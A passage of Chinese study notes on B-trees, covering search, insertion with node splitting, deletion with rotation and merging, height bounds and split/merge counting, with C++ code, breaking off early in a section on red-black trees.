<span class="number">0</span>, <span class="literal">NULL</span> ); &#125;</span><br><span class="line">   BTNode ( T e, BTNodePosi(T) lc = <span class="literal">NULL</span>, BTNodePosi(T) rc = <span class="literal">NULL</span> ) &#123;</span><br><span class="line">      parent = <span class="literal">NULL</span>; <span class="comment">//作为根节点，而且初始时</span></span><br><span class="line">      key.insert ( <span class="number">0</span>, e ); <span class="comment">//只有一个关键码，以及</span></span><br><span class="line">      child.insert ( <span class="number">0</span>, lc ); child.insert ( <span class="number">1</span>, rc ); <span class="comment">//两个孩子</span></span><br><span class="line">      <span class="keyword">if</span> ( lc ) lc-&gt;parent = <span class="keyword">this</span>; <span class="keyword">if</span> ( rc ) rc-&gt;parent = <span class="keyword">this</span>;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>同一节点的所有孩子组成一个向量，各相邻孩子之间组成一个向量。按照B树的定义，孩子向量的实际长度总是比关键码向量多一。</p>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p>B树结构非常适宜在相对更小的内存中，实现对大规模数据的高效操作。</p>
<p>B树的查找过程和二叉搜索树的查找过程类似，首先将根节点作为当前节点，只要当前节点不是外部节点，就在当前节点中顺序查找，若找到目标关键码，则返回查找成功，否则沿着引用转至相应子树，将其根节点读入内存，并更新当前节点。若当前节点为外部节点，则返回查找失败。</p>
<p>只有在切换和更新当前节点时才会涉及I/O操作，而在同一节点内部的查找则完全在内存中进行。因内存的访问效率远远高于内存，再考虑到各节点的关键码数量通常在128到512之间，所以直接采用顺序查找策略。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BTNodePosi(T) BTree&lt;T&gt;::search ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//在B-树中查找关键码e</span></span><br><span class="line">   BTNodePosi(T) v = _root; _hot = <span class="literal">NULL</span>; <span class="comment">//从根节点出发</span></span><br><span class="line">   <span class="keyword">while</span> ( v ) &#123; <span class="comment">//逐层查找</span></span><br><span class="line">      Rank r = v-&gt;key.search ( e ); <span class="comment">//在当前节点中，找到不大于e的最大关键码</span></span><br><span class="line">      <span class="keyword">if</span> ( ( <span class="number">0</span> &lt;= r ) &amp;&amp; ( e == v-&gt;key[r] ) ) <span class="keyword">return</span> v; <span class="comment">//成功：在当前节点中命中目标关键码</span></span><br><span class="line">      _hot = v; v = v-&gt;child[r + <span class="number">1</span>]; <span class="comment">//否则，转入对应子树（_hot指向其父）——需做I/O，最费时间</span></span><br><span class="line">   &#125; <span class="comment">//这里在向量内是二分查找，但对通常的_order可直接顺序查找</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//失败：最终抵达外部节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上算法直接调用了有序向量的<code>search()</code>接口。</p>
<p><strong>性能分析</strong></p>
<p>B树查找的过程主要消耗于：</p>
<ul>
<li>将某一节点载入内存</li>
<li>在内存中对当前节点进行查找</li>
</ul>
<p>鉴于内存、外存在访问速度上的差异，相对于前一类时间消耗，后一时间消耗可忽略不计。B树查找操作的效率主要取决于查找过程中的外存访问次数。</p>
<p>约定B树的树根节点常驻RAM，那么对于高度为$h$的子树，外存访问不超过$O(h-1)$次。</p>
<p>每次查找过程中共需访问$O(log_mN)$个节点，相应地需要做$O(log_mN)$次外存读取操作。由此可知，存有$N$个关键码的$m$阶B树每次查找操作，耗时不过$O(log_mN)$。</p>
<p><strong>树高</strong></p>
<p>若存有$N$个关键码的$m$阶B树的高度为$h$，则必有：</p>
<p>$log_m(N+1) \leq h \leq log_{\lceil m/2 \rceil} {\lfloor (N+1)/2 \rfloor} +1$</p>
<p>首先证明$h \leq log_{\lceil m/2 \rceil} {\lfloor (N+1)/2 \rfloor} +1$ 。关键码总数固定时，为使B树更高，各内部节点都应包含尽可能少的关键码。于是按照B树的定义，各高度层次上节点数目至少是：</p>
<p>$n_0=1$</p>
<p>$n_1=2$</p>
<p>$n_2=2 \lceil m/2 \rceil$</p>
<p>$n_3=2 \lceil m/2 \rceil ^2$</p>
<p>$n_4=2 \lceil m/2 \rceil ^3$</p>
<p>…</p>
<p>$n_{h-1}=2 \lceil m/2 \rceil ^{h-2}$</p>
<p>$n_h=2 \lceil m/2 \rceil ^{h-1}$</p>
<p>设向量节点个数为$n_m$,则除了根节点以外每个向量节点均有$\lceil m/2 \rceil$个分支，总的分支数目为$\lceil m/2 \rceil n_m$。</p>
<p>考虑除了根节点以外的向量节点，</p>
<p>根据树的性质有$n=n_m+n_0=\lceil m/2 \rceil n_m+1$</p>
<p>则$n_0=(\lceil m/2 \rceil -1)n_m+1$</p>
<p>叶节点，即是外部的向量节点，均只有一个关键码，而内部节点均有$\lceil m/2 \rceil -1$个关键码，则对应的节点有$(\lceil m/2 \rceil) -1n_m$个，设内部节点总数为$n_{sum}$，对应有$n_h=n_{sum}+1$</p>
<p>现考查外部节点，这些节点对应于失败的查找,故其数量$n_h$应等于失败查找情形可能的总数$n_{sum}$，即应比成功查找可能情形的总数恰好多一，而后者等于关键码的总数$N$。</p>
<p>于是有，</p>
<p>$N+1=n_h \geq 2(\lceil m/2 \rceil)^{h-1} $</p>
<p>即$h \leq log_{\lceil m/2 \rceil} {\lfloor (N+1)/2 \rfloor} +1$</p>
<p>再来证明$log_m(N+1) \leq h$。同理，关键码总数一定时，为使B树更矮，每个内部节点都应该包含尽可能多的关键码。按照B树的定义，各高度节点上的节点数目至多是：</p>
<p>$n_0=1$</p>
<p>$n_1=m$</p>
<p>$n_2=m^2$</p>
<p>…</p>
<p>$n_h=m^h$</p>
<p>与上同理，有$N+1=n_h \leq m^h$</p>
<p>即$\Omega (log_mN)=log_m(N+1) \leq h$ </p>
<p>也就是说存有$N$个关键码的$m$阶B树的高度$h= \Theta(log_mN)$</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> BTree&lt;T&gt;::insert ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//将关键码e插入B树中</span></span><br><span class="line">   BTNodePosi(T) v = search ( e ); <span class="keyword">if</span> ( v ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//确认目标节点不存在</span></span><br><span class="line">   Rank r = _hot-&gt;key.search ( e ); <span class="comment">//在节点_hot的有序关键码向量中查找合适的插入位置</span></span><br><span class="line">   _hot-&gt;key.insert ( r + <span class="number">1</span>, e ); <span class="comment">//将新关键码插至对应的位置</span></span><br><span class="line">   _hot-&gt;child.insert ( r + <span class="number">2</span>, <span class="literal">NULL</span> ); <span class="comment">//创建一个空子树指针</span></span><br><span class="line">   _size++; <span class="comment">//更新全树规模</span></span><br><span class="line">   solveOverflow ( _hot ); <span class="comment">//如有必要，需做分裂</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//插入成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为在B树中插入一个关键码$e$，首先调用<code>search(e)</code>在树中查找该关键码，若查找成功则按照禁止重复关键码的约定不予插入，操作即告完成并返回<code>false</code>。若查找终止于一外部节点v，且其父亲由变量hot指示。此时hot必然指向某一叶节点(当然也可能时根节点)。接下来，在该节点中再次查找关键码e,确定e在其中的插入位置r,只需将e插入至这一位置。</p>
<p>在<code>hot</code>所指示的节点中增加了一个关键码。若该节点的关键码仍然合法，则插入操作随即完成。否则，则称该节点发生了一次上溢，此时需要经过适当的处理来使该节点以及整树满足B树的条件。</p>
<p><strong>上溢和分裂</strong></p>
<p>一般地，刚发生上溢的节点应恰好有$m$个关键码。若取$s=\lfloor m/2 \rfloor$ ,则它们依次为：</p>
<p>${k_0,k_1,…,k_{s-1},k_s,k_{s+1},…,k_{m-1}}$</p>
<p>可见，以$k_s$为界，可将该节点分为前、后两个子节点，二者大致等长。于是，可令关键码$k_s$上升一层，归入其父节点中的适当位置，并分别以这两个子节点作为左、右孩子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//关键码插入后若节点上溢，则做节点分裂处理</span></span><br><span class="line"><span class="keyword">void</span> BTree&lt;T&gt;::solveOverflow ( BTNodePosi(T) v ) &#123;</span><br><span class="line">   <span class="keyword">if</span> ( _order &gt;= v-&gt;child.size() ) <span class="keyword">return</span>; <span class="comment">//递归基：当前节点并未上溢</span></span><br><span class="line">   Rank s = _order / <span class="number">2</span>; <span class="comment">//轴点（此时应有_order = key.size() = child.size() - 1）</span></span><br><span class="line">   BTNodePosi(T) u = <span class="keyword">new</span> BTNode&lt;T&gt;(); <span class="comment">//注意：新节点已有一个空孩子</span></span><br><span class="line">   <span class="keyword">for</span> ( Rank j = <span class="number">0</span>; j &lt; _order - s - <span class="number">1</span>; j++ ) &#123; <span class="comment">//v右侧_order-s-1个孩子及关键码分裂为右侧节点u</span></span><br><span class="line">      u-&gt;child.insert ( j, v-&gt;child.remove ( s + <span class="number">1</span> ) ); <span class="comment">//逐个移动效率低</span></span><br><span class="line">      u-&gt;key.insert ( j, v-&gt;key.remove ( s + <span class="number">1</span> ) ); <span class="comment">//此策略可改进</span></span><br><span class="line">   &#125;</span><br><span class="line">   u-&gt;child[_order - s - <span class="number">1</span>] = v-&gt;child.remove ( s + <span class="number">1</span> ); <span class="comment">//移动v最靠右的孩子</span></span><br><span class="line">   <span class="keyword">if</span> ( u-&gt;child[<span class="number">0</span>] ) <span class="comment">//若u的孩子们非空，则</span></span><br><span class="line">      <span class="keyword">for</span> ( Rank j = <span class="number">0</span>; j &lt; _order - s; j++ ) <span class="comment">//令它们的父节点统一</span></span><br><span class="line">         u-&gt;child[j]-&gt;parent = u; <span class="comment">//指向u</span></span><br><span class="line">   BTNodePosi(T) p = v-&gt;parent; <span class="comment">//v当前的父节点p</span></span><br><span class="line">   <span class="keyword">if</span> ( !p ) &#123; _root = p = <span class="keyword">new</span> BTNode&lt;T&gt;(); p-&gt;child[<span class="number">0</span>] = v; v-&gt;parent = p; &#125; <span class="comment">//若p空则创建之</span></span><br><span class="line">   Rank r = <span class="number">1</span> + p-&gt;key.search ( v-&gt;key[<span class="number">0</span>] ); <span class="comment">//p中指向u的指针的秩</span></span><br><span class="line">   p-&gt;key.insert ( r, v-&gt;key.remove ( s ) ); <span class="comment">//轴点关键码上升</span></span><br><span class="line">   p-&gt;child.insert ( r + <span class="number">1</span>, u );  u-&gt;parent = p; <span class="comment">//新节点u与父节点p互联</span></span><br><span class="line">   solveOverflow ( p ); <span class="comment">//上升一层，如有必要则继续分裂——至多递归O(logn)层</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度</strong></p>
<p>若将B树的阶次$m$视为常数，则关键码的移动和复制操作的时间都可以忽略。至于<code>solveOverflow()</code>算法，每一递归实例均只需常数时间，递归层数不超过B树高度，由此可知，对于存有$n$个关键码的B树，每次插入操作可在$O(log_mn)$时间完成。</p>
<p>实际上，因插入操作而导致$\Omega(log_mn)$次分裂的情况极为罕见，单次插入操作平均引发的分裂次数远远低于这一估计，故时间通常消耗于对目标关键码的查找。</p>
<blockquote>
<p>现拟将一组共$n$个互异的关键码，插入至一棵初始为空的$m$阶B树中，按照何种次序插入可使得到的B树高度最大？按照何种次序插入可使得到的B树高度最小</p>
</blockquote>
<p>按照单调次序插入所有关键码可使得B树高度达到最大，得到B树的高度为$h=log_{\lceil m/2 \rceil} {\lfloor (n+1)/2\rfloor}+1$。</p>
<p>每$m$个关键码为一组，相邻两组为一个单位，设前者为$l$，后者为$r$,先插入$l$中的前$\lfloor (m-1)/2 \rfloor$个元素，再插入$r$中的前$\lfloor(m-1)/2 \rfloor$个元素，然后插入$l$和$r$中第$m$大的元素，若最后划分得到的元素剩余个数不满足一个单位的要求则可按照单调次序插入，如此插入可使得的$b$树高度最小。</p>
<blockquote>
<p>考查任意阶的B树，若T的初始高度为1，而经过若干次插入操作之后，高度增加至$h$，且共有$n$个内部节点，则再次过程中T的分裂操作有多少次</p>
</blockquote>
<p>考查因关键码插入而引起的任何一次分裂操作，</p>
<p>被分裂的节点无非两种情况，</p>
<ul>
<li>若它不是根节点，则树中的节点增加一个，同时树高保持不变，故有$n+=1$和$h+=0$</li>
<li>若是根节点，则除了原节点一分为二，还会新生成一个仅含单关键码的树根，同时树的高度也将相应的升高一层，故有:$n+=2$和$h+=1$</li>
</ul>
<p>可见，无论如何，$n$和$h$的差值均会恰好地增加一个单位，因此$n-h$可视为分裂操作的一个计数器。该计数器的初始值为$1-1=0$,故最终的$n-h$即是整个操作过程中所做分裂次数的总次数。</p>
<p>推广，若初始节点数为$n_0$,高度为$h_0$,则经过若干次插入操作后，高度为$h$,节点数为$n$，则B树的分裂次数为$n-h-(n_0-h_0)$</p>
<blockquote>
<p>每次插入平均引发了多少次分裂操作</p>
</blockquote>
<p>累计发生的分裂次数，不仅取决于连续插入操作的次数，同时也取决于最终的树高。<br>若关键码固定为$N$,为使节点尽可能多，内部节点各自所含的关键码应尽可能少，根节点必定含有1个关键码，其余内部节点至少包含$\lceil m/2 \rceil -1$个关键码，故必有：</p>
<p>$n \leq 1+(N-1)/(\lceil m/2 \rceil-1)$</p>
<p>在如上连续的$N$次插入中，分裂操作的平均次数必然不超过：</p>
<p>$(n-h)/N &lt; n/N &lt; 1/(\lceil m/2 \rceil -1)$</p>
<p>平均而言，大致每经过$\lceil m/2 \rceil-1$ 次插入,才会引发一次分裂。</p>
<p>某一节点的插入在最坏情况下可能引发多达$\Omega(log_mN)$次分裂操作，但是平均意义而言，这类最坏情况发生的概率极低。</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>为了从B树中删除关键码$e$，首先需要调用<code>search(e)</code>查找$e$所属的节点，若查找失败则说明关键码$e$不存在，删除操作随即完成。目标关键码所在的节点由$v$指示。此时通过顺序查找可进一步确定$e$在节点$v$中的秩$r$。</p>
<p>不妨假定$v$是叶节点，否则$e$的直接前驱(后继)在左、右子树中必然存在，可在$O(height(v))$时间内确定它们的位置，其中$height(v)$为二者的高度。此处不妨选用直接后继，于是，$e$的直接后继关键码所属的节点$u$是叶节点。</p>
<p>接下来可将$e$与$u[0]$互换位置，即可确保待删除的节点v就是叶节点。</p>
<p>直接将$e$(以及其左侧的空节点)从$v$中删去，如此,节点$v$中所含的关键码以及空分支将减少一个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> BTree&lt;T&gt;::remove ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//从BTree树中删除关键码e</span></span><br><span class="line">   BTNodePosi(T) v = search ( e ); <span class="keyword">if</span> ( !v ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//确认目标关键码存在</span></span><br><span class="line">   Rank r = v-&gt;key.search ( e ); <span class="comment">//确定目标关键码在节点v中的秩（由上，肯定合法）</span></span><br><span class="line">   <span class="keyword">if</span> ( v-&gt;child[<span class="number">0</span>] ) &#123; <span class="comment">//若v非叶子，则e的后继必属于某叶节点</span></span><br><span class="line">      BTNodePosi(T) u = v-&gt;child[r+<span class="number">1</span>]; <span class="comment">//在右子树中一直向左，即可</span></span><br><span class="line">      <span class="keyword">while</span> ( u-&gt;child[<span class="number">0</span>] ) u = u-&gt;child[<span class="number">0</span>]; <span class="comment">//找出e的后继</span></span><br><span class="line">      v-&gt;key[r] = u-&gt;key[<span class="number">0</span>]; v = u; r = <span class="number">0</span>; <span class="comment">//并与之交换位置</span></span><br><span class="line">   &#125; <span class="comment">//至此，v必然位于最底层，且其中第r个关键码就是待删除者</span></span><br><span class="line">   v-&gt;key.remove ( r ); v-&gt;child.remove ( r + <span class="number">1</span> ); _size--; <span class="comment">//删除e，以及其下两个外部节点之一</span></span><br><span class="line">   solveUnderflow ( v ); <span class="comment">//如有必要，需做旋转或合并</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时，若该节点所含的关键码的总数依然合法(即不少于$\lceil m/2 \rceil-1$)，则删除操作随即完成，否则，称该节点发生了下溢，并需要经过适当的处理，将该节点以及整数重新满足B树的条件。</p>
<p><strong>下溢和合并</strong></p>
<p><img src="https://i.loli.net/2019/09/13/kqnsiNx6fF5LEQb.png"></p>
<p><img src="https://i.loli.net/2019/09/13/RYFQBuN12a9jIm6.png"></p>
<p>另外解释一下，$L$和$R$必有其一，根据B树的定义，所有外部节点均深度相等，$v$不为外部节点，所以必然存在与$v$同高度并不为空的节点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//关键码删除后若节点下溢，则做节点旋转或合并处理</span></span><br><span class="line"><span class="keyword">void</span> BTree&lt;T&gt;::solveUnderflow ( BTNodePosi(T) v ) &#123;</span><br><span class="line">   <span class="keyword">if</span> ( ( _order + <span class="number">1</span> ) / <span class="number">2</span> &lt;= v-&gt;child.size() ) <span class="keyword">return</span>; <span class="comment">//递归基：当前节点并未下溢</span></span><br><span class="line">   BTNodePosi(T) p = v-&gt;parent;</span><br><span class="line">   <span class="keyword">if</span> ( !p ) &#123; <span class="comment">//递归基：已到根节点，没有孩子的下限</span></span><br><span class="line">      <span class="keyword">if</span> ( !v-&gt;key.size() &amp;&amp; v-&gt;child[<span class="number">0</span>] ) &#123;</span><br><span class="line">         <span class="comment">//但倘若作为树根的v已不含关键码，却有（唯一的）非空孩子，则</span></span><br><span class="line">         _root = v-&gt;child[<span class="number">0</span>]; _root-&gt;parent = <span class="literal">NULL</span>; <span class="comment">//这个节点可被跳过</span></span><br><span class="line">         v-&gt;child[<span class="number">0</span>] = <span class="literal">NULL</span>; release ( v ); <span class="comment">//并因不再有用而被销毁</span></span><br><span class="line">      &#125; <span class="comment">//整树高度降低一层</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   Rank r = <span class="number">0</span>; <span class="keyword">while</span> ( p-&gt;child[r] != v ) r++;</span><br><span class="line">   <span class="comment">//确定v是p的第r个孩子——此时v可能不含关键码，故不能通过关键码查找</span></span><br><span class="line">   <span class="comment">//另外，在实现了孩子指针的判等器之后，也可直接调用Vector::find()定位</span></span><br><span class="line"><span class="comment">// 情况1：向左兄弟借关键码</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt; r ) &#123; <span class="comment">//若v不是p的第一个孩子，则</span></span><br><span class="line">      BTNodePosi(T) ls = p-&gt;child[r - <span class="number">1</span>]; <span class="comment">//左兄弟必存在</span></span><br><span class="line">      <span class="keyword">if</span> ( ( _order + <span class="number">1</span> ) / <span class="number">2</span> &lt; ls-&gt;child.size() ) &#123; <span class="comment">//若该兄弟足够“胖”，则</span></span><br><span class="line">         v-&gt;key.insert ( <span class="number">0</span>, p-&gt;key[r - <span class="number">1</span>] ); <span class="comment">//p借出一个关键码给v（作为最小关键码）</span></span><br><span class="line">         p-&gt;key[r - <span class="number">1</span>] = ls-&gt;key.remove ( ls-&gt;key.size() - <span class="number">1</span> ); <span class="comment">//ls的最大关键码转入p</span></span><br><span class="line">         v-&gt;child.insert ( <span class="number">0</span>, ls-&gt;child.remove ( ls-&gt;child.size() - <span class="number">1</span> ) );</span><br><span class="line">         <span class="comment">//同时ls的最右侧孩子过继给v</span></span><br><span class="line">         <span class="keyword">if</span> ( v-&gt;child[<span class="number">0</span>] ) v-&gt;child[<span class="number">0</span>]-&gt;parent = v; <span class="comment">//作为v的最左侧孩子</span></span><br><span class="line">         <span class="keyword">return</span>; <span class="comment">//至此，通过右旋已完成当前层（以及所有层）的下溢处理</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="comment">//至此，左兄弟要么为空，要么太“瘦”</span></span><br><span class="line"><span class="comment">// 情况2：向右兄弟借关键码</span></span><br><span class="line">   <span class="keyword">if</span> ( p-&gt;child.size() - <span class="number">1</span> &gt; r ) &#123; <span class="comment">//若v不是p的最后一个孩子，则</span></span><br><span class="line">      BTNodePosi(T) rs = p-&gt;child[r + <span class="number">1</span>]; <span class="comment">//右兄弟必存在</span></span><br><span class="line">      <span class="keyword">if</span> ( ( _order + <span class="number">1</span> ) / <span class="number">2</span> &lt; rs-&gt;child.size() ) &#123; <span class="comment">//若该兄弟足够“胖”，则</span></span><br><span class="line">         <span class="comment">/*DSA*/</span><span class="built_in">printf</span> ( <span class="string">&quot; ... case 2\n&quot;</span> );</span><br><span class="line">         v-&gt;key.insert ( v-&gt;key.size(), p-&gt;key[r] ); <span class="comment">//p借出一个关键码给v（作为最大关键码）</span></span><br><span class="line">         p-&gt;key[r] = rs-&gt;key.remove ( <span class="number">0</span> ); <span class="comment">//ls的最小关键码转入p</span></span><br><span class="line">         v-&gt;child.insert ( v-&gt;child.size(), rs-&gt;child.remove ( <span class="number">0</span> ) );</span><br><span class="line">         <span class="comment">//同时rs的最左侧孩子过继给v</span></span><br><span class="line">         <span class="keyword">if</span> ( v-&gt;child[v-&gt;child.size() - <span class="number">1</span>] ) <span class="comment">//作为v的最右侧孩子</span></span><br><span class="line">            v-&gt;child[v-&gt;child.size() - <span class="number">1</span>]-&gt;parent = v;</span><br><span class="line">         <span class="keyword">return</span>; <span class="comment">//至此，通过左旋已完成当前层（以及所有层）的下溢处理</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="comment">//至此，右兄弟要么为空，要么太“瘦”</span></span><br><span class="line"><span class="comment">// 情况3：左、右兄弟要么为空（但不可能同时），要么都太“瘦”——合并</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt; r ) &#123; <span class="comment">//与左兄弟合并</span></span><br><span class="line">      BTNodePosi(T) ls = p-&gt;child[r - <span class="number">1</span>]; <span class="comment">//左兄弟必存在</span></span><br><span class="line">      ls-&gt;key.insert ( ls-&gt;key.size(), p-&gt;key.remove ( r - <span class="number">1</span> ) ); p-&gt;child.remove ( r );</span><br><span class="line">      <span class="comment">//p的第r - 1个关键码转入ls，v不再是p的第r个孩子</span></span><br><span class="line">      ls-&gt;child.insert ( ls-&gt;child.size(), v-&gt;child.remove ( <span class="number">0</span> ) );</span><br><span class="line">      <span class="keyword">if</span> ( ls-&gt;child[ls-&gt;child.size() - <span class="number">1</span>] ) <span class="comment">//v的最左侧孩子过继给ls做最右侧孩子</span></span><br><span class="line">         ls-&gt;child[ls-&gt;child.size() - <span class="number">1</span>]-&gt;parent = ls;</span><br><span class="line">      <span class="keyword">while</span> ( !v-&gt;key.empty() ) &#123; <span class="comment">//v剩余的关键码和孩子，依次转入ls</span></span><br><span class="line">         ls-&gt;key.insert ( ls-&gt;key.size(), v-&gt;key.remove ( <span class="number">0</span> ) );</span><br><span class="line">         ls-&gt;child.insert ( ls-&gt;child.size(), v-&gt;child.remove ( <span class="number">0</span> ) );</span><br><span class="line">         <span class="keyword">if</span> ( ls-&gt;child[ls-&gt;child.size() - <span class="number">1</span>] ) ls-&gt;child[ls-&gt;child.size() - <span class="number">1</span>]-&gt;parent = ls;</span><br><span class="line">      &#125;</span><br><span class="line">      release ( v ); <span class="comment">//释放v</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//与右兄弟合并</span></span><br><span class="line">      BTNodePosi(T) rs = p-&gt;child[r + <span class="number">1</span>]; <span class="comment">//右兄度必存在</span></span><br><span class="line">      rs-&gt;key.insert ( <span class="number">0</span>, p-&gt;key.remove ( r ) ); p-&gt;child.remove ( r );</span><br><span class="line">      <span class="comment">//p的第r个关键码转入rs，v不再是p的第r个孩子</span></span><br><span class="line">      rs-&gt;child.insert ( <span class="number">0</span>, v-&gt;child.remove ( v-&gt;child.size() - <span class="number">1</span> ) );</span><br><span class="line">      <span class="keyword">if</span> ( rs-&gt;child[<span class="number">0</span>] ) rs-&gt;child[<span class="number">0</span>]-&gt;parent = rs; <span class="comment">//v的最左侧孩子过继给ls做最右侧孩子</span></span><br><span class="line">      <span class="keyword">while</span> ( !v-&gt;key.empty() ) &#123; <span class="comment">//v剩余的关键码和孩子，依次转入rs</span></span><br><span class="line">         rs-&gt;key.insert ( <span class="number">0</span>, v-&gt;key.remove ( v-&gt;key.size() - <span class="number">1</span> ) );</span><br><span class="line">         rs-&gt;child.insert ( <span class="number">0</span>, v-&gt;child.remove ( v-&gt;child.size() - <span class="number">1</span> ) );</span><br><span class="line">         <span class="keyword">if</span> ( rs-&gt;child[<span class="number">0</span>] ) rs-&gt;child[<span class="number">0</span>]-&gt;parent = rs;</span><br><span class="line">      &#125;</span><br><span class="line">      release ( v ); <span class="comment">//释放v</span></span><br><span class="line">   &#125;</span><br><span class="line">   solveUnderflow ( p ); <span class="comment">//上升一层，如有必要则继续分裂——至多递归O(logn)层</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若T的初始高度为$h$且含有$n$个内部节点，而在经过连续的若干次操作之后高度下降至1，则在此过程中T总计合并过多少次</p>
</blockquote>
<p>被合并的节点无非两种情况</p>
<ul>
<li>若它不是根节点，则树中的节点减少一个，同时树高保持不变，故有$n-=1$和$h-=0$</li>
<li>若是根节点，则除了原节点一分为二，还会新生成一个仅含单关键码的树根，同时树的高度也将相应的升高一层，故有:$n-=2$和$h-=1$</li>
</ul>
<p>因此，无论如何，$n$与$h$的差值$n-h$均会恰好减少一个单位。既然最终有：</p>
<p>$n=h=1$</p>
<p>故其间发生合并操作的次数等于$n-h$的初值。</p>
<p>以上结论和各关键码的数值大小以及具体的删除过程无关，仅取决于B树的最初和最终状态。</p>
<blockquote>
<p>设T的初始高度为1,在随后经过若干次插入和删除操作(次序任意，可能相间)，若在此其间做过S次分裂和M次合并，则必定有$S-M=n-h$</p>
</blockquote>
<p>在B树整个生命期内，$n-h$始终忠实地反应了分裂操作次数和合并操作次数之差。</p>
<p>推广，若初始节点数为$n_0$,高度为$h_0$,则经过若干次$S$次插入和$M$次删除操作后，高度为$h$,节点数为$n$，则B树的分裂次数为$S-M=n-h-(n_0-h_0)$</p>
<p>以上B树的插入和删除算法并不对称，比如，删除关键码时若发生下溢，则可能采用旋转(通过父节点间接地从兄弟借得一个关键码)或者合并两种手段加以恢复，然而在插入关键码时却只是统一地通过分裂来进行修复。</p>
<p>实际上理论来讲，也可优先通过旋转来修复上溢:只要某个兄弟仍处于非饱和状态，即可通过父亲间接地从该兄弟借出一个关键码。</p>
<p>表面上看，B树的插入操作和删除操作方向相反、过程互逆，但二者并非简单的对称关系。在删除操作的过程中，若当前节点下溢，未必能通过合并予以修复，除非其兄弟节点也出于下溢的临界状态。在插入过程中，若当前节点发生上溢，则无论其兄弟节点的状态和规模如何，总是可以立即对其实施分裂操作。</p>
<p>实际上就算法控制逻辑而言，优先进行分裂更为明了，在B树生命周期内，分裂操作通常不至于频繁发生，因此不妨采用优先分裂的策略。</p>
<p>另外，优先分裂也不至于导致空间利用率的显著下降。实际上，无论分裂出多少个节点，根据B树的定义，其空间利用率最差也不至于低于50%。</p>
<p>最后，优先分裂策略也不至于导致树高的明显增加，树高决定I/O负担以及访问效率的主要因素。B树高度主要取决于所存关键码的总数，和其中节点的数目几乎没有关系。</p>
<h1 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h1><p>伸展树实现简便、无需修改节点结构、分摊复杂度低，但可惜最坏情况下单次操作需要$\Omega(n)$时间，故难以应用核电站、医院等可靠性和稳定性要求极高的场合。AVL树尽管可以保证最坏情况下的单次操作速度，但需在节点中嵌入平衡因子等标识，删除之后的重平衡可能需多达$\Omega(logn)$次旋转，从而频繁地导致全树拓扑结构地大幅变化。</p>
<p>红黑树通过为节点指定颜色，并巧妙地动态调整，可在每次插入或删除之后仅需常数个节点。尽管最坏情况下需对$\Omega(logn)$个节点重染色，但是分摊意义而言仅为$O(1)$个。</p>
<p>与之前类似，便于分析，红黑树同样引入外部节点。</p>
<p>红黑树的规则</p>
<ul>
<li>树根必定为黑色</li>
<li>外部节点必定为黑色</li>
<li>红之子、父必为黑</li>
<li>从任一外部节点到根节点的沿途，黑节点的数目相等</li>
</ul>
<h2 id="4阶B树"><a href="#4阶B树" class="headerlink" title="4阶B树"></a>4阶B树</h2><p>在红黑树和4阶B树之间，存在即为密切的联系：经适当转换之后，二者相互等价。</p>
<p>具体地，自顶而下考查红黑树各节点。每遇到一个红节点，都将对应的子树整体提升一层，从而与其父节点(必定为黑)水平对齐，二者之间的联边相应地调整为横向。如此转换以后，横向边向左或者向右，但由红黑树的条件，同向边必然不相邻，即便不考虑联边的左、右方向，沿水平方向相邻的边至多两条(向左、右)各一条，涉及的节点最多(一个节点加上零到两个红节点)。此时，若将红黑树中的节点视为关键码，则沿水平方向相邻的每一组节点恰好构成4阶B树的一个节点。</p>
<p>所有的可能情况有四种，相应的转换过程：</p>
<p><img src="https://i.loli.net/2019/09/14/AoJOaW2veMipu1K.png"></p>
<h2 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h2><p>不妨假定经调用接口<code>search()</code>查找之后，确认目标节点尚不存在。在查找失败处的位置$x$创建节点，并随即将其染成红色(除非全树仅含一个节点)。</p>
<p>此时可能不满足红之父、子必黑的条件，此时x的父亲科恩那个也是红色。</p>
